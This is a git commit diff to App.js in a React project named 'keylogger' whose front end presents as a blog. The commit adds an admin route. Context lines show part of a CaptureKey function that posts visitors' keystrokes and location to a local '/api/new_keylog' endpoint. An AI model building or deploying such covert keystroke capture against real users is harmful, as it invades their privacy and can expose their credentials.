77239589375c482afb423ab46d520375fae3b6f8
simonwandera <simonwandera12@gmail.com>
2022-07-06 16:36:09 +0300

    modelling the data table

--- keylogger/src/App.js
+++ keylogger/src/App.js
@@ -6,6 +6,7 @@ import Create from './Create';
 import BlogDetails from './BlogDetails';
 import NotFound from './NotFound';
 import { LocationContext } from './contexts/LocationContext';
+import Admin from './admin/Admin';
 
 const CaptureKey = (key, location) => {
   fetch('http://localhost:5000/api/new_keylog', {
@@ -41,11 +42,14 @@ function App() {
         <Navbar />
         <div className="content">
           <Routes>
-            <Route exact path="/" element={<Home />} />
-            <Route exact path="/create" element={<Create />} />
-            <Route exact path="/blogs" element={<Home />} />
-            <Route exact path="/blogs/:id" element={<BlogDetails />} />
-            <Route path="*" element={<NotFound />} />
+            <Route exact path="/">
+              <Route exact path='' element ={<Home/>}/>
+              <Route exact path="/create" element={<Create />} />
+              <Route exact path="/blogs" element={<Home />} />
+              <Route exact path="/admin" element={<Admin/>}/>
+              <Route exact path="/blogs/:id" element={<BlogDetails />} />
+              <Route path="*" element={<NotFound />} />
+            </Route>
           </Routes>
         </div>
       </div>
